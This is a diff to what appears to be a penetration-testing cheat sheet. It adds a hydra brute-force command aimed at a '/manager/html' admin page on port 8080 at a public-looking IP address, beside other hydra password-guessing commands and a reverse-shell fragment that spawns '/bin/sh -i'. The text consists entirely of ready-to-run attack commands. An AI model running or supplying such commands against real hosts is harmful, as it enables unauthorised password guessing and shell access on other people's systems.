@@ -169,6 +169,8 @@ c = p.call(["/bin/sh","-i"]);
 ```bash
 # basic authentication
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.103.251 http-get /inferno -t 64
+# with custom ports
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 164.100.83.45 http-get /manager/html -s 8080 -t 64
 
 # template cmd..
 hydra -l <username> -P <wordlist> 10.10.241.210 http-post-form "/<path_to_go>:username=^USER^&password=^PASS^:F=incorrect" -V
